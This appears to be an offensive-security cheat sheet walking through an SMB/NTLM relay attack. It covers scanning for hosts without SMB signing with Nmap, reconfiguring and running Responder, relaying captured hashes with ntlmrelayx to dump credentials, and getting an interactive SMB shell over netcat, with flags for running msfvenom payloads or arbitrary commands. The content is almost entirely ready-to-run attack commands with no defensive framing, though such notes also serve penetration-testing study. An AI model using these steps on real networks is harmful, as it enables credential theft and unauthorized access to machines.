
+ Instead of cracking the captured hashes in responder, we can relay the hashes to specific machines and gain access.
+ SMB Signing must be disabled on the target.
+ Relayed user credential must be admin on machine.

1. Discover Hosts with SMB Signing Disabled using Nmap

```sh
$ nmap --script smb2-security-mode -p 445 <IP/Subnet: 192.168.1.2/24>
# check for status "Message signing enabled but not required"
```

2. Save the vulnerable targets in to a target.txt file

3. In order to attack, We have to make some modification in the configuration file of Responder
Make sure SMB and HTTP are turned off, because we are now going to respond. Done listening. lol
```sh
$ vim /etc/responder/Responder.conf
SMB = off
HTTP = off
```

4. Once the modification are done, Run Responder
```sh
$ responder -I <interface: tun0> -rdwv
# verify smb and http are turned off
```

5. We have to move on to another window and run ntlmrelayx now.
```sh
# Install impacket on attack machine
$ ntlmrelayx -tf <fileofIPwithsmbsigningdisabled: targets.txt> -smb2support

```
4. Wait for an event to occur and attack will happen.
5. Victim user should have admin role in target machines, then only attack will be successfull.
6. Wait for the dump in ntlmrelay window.
7. Save the dumped hashes to a text file for later attacks.

### Gain a SMB Shell

1. Run Responder 
```sh
$ responder -I <interface: tun0> -rdwv
# verify smb and http are turned off
```

2. Run ntlmrelayx in another tab
```sh
# Install impacket on attack machine
$ ntlmrelayx -tf <fileofIPwithsmbsigningdisabled: targets.txt> -smb2support -i
# added the flag '-i' in the command to get interactive shell after attack
# add ''-e' flag for execute msfvenom payload to get meterpreter session
# add '-c' flag to execute any commands like '-c "whoami" '
```
3. ntlmrelayx will show the ip and port once a shell is created
4. Connect to shell using netcat on another window using provided info
```sh
$ nc <IP Address> <port>
# SMB Shell Access
$ help
$ shares
$ use <sharename>
```